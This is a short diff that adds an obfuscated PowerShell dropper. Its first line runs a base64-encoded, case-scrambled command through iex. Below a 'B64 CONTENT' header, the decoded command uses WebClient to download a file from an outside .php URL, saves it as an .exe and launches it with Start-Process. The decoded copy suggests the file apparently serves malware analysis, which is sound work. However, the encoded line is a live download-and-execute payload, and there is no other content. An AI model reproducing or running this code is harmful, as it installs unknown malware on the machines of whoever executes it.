@@ -1,0 +1,7 @@
+iex([sySTEm.TEXT.eNcODing]::uTF8.GetStRIng([SYsTeM.cONvErT]::FrOmBAsE64sTRING('CigobmV3LW9iamVjdCBuRXQud0ViY0xpZW5UKS5Eb3dubE9hRGZJbGUoJ2h0dHA6Ly9tYXhpLmJlcmdtZXR6Z2VyZWkuY2gvc2lydXRvL2ZheGVxaS9kb3NveGEucGhwJywnMWFzZGFzZC5leGUnKSk7U3RhcnQtUHJvY2VzcyAnMWFzZGFzZC5leGUnOwoK')));exit
+
+##### B64 CONTENT #####
+
+
+((new-object nEt.wEbcLienT).DownlOaDfIle('http://maxi.bergmetzgerei.ch/siruto/faxeqi/dosoxa.php','1asdasd.exe'));Start-Process '1asdasd.exe';
+
